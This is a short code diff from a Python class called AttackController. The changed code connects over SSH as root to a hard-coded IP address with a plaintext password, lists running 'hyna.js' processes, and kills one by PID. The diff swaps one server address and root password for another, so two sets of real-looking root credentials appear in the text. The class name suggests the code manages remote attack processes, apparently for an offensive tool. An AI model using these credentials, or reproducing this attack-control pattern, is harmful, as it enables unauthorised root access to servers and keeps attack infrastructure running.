@@ -488,7 +488,7 @@ class AttackController:
         try:
             sshClient = paramiko.SSHClient()
             sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
             
             stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | grep -v 'xvfb'")
             raw_process_list = stdout.read().decode().strip().split("\n")
@@ -521,7 +521,7 @@ class AttackController:
 
             sshClient = paramiko.SSHClient()
             sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
             
             command = f"kill -9 {pid}"
             sshClient.exec_command(command)
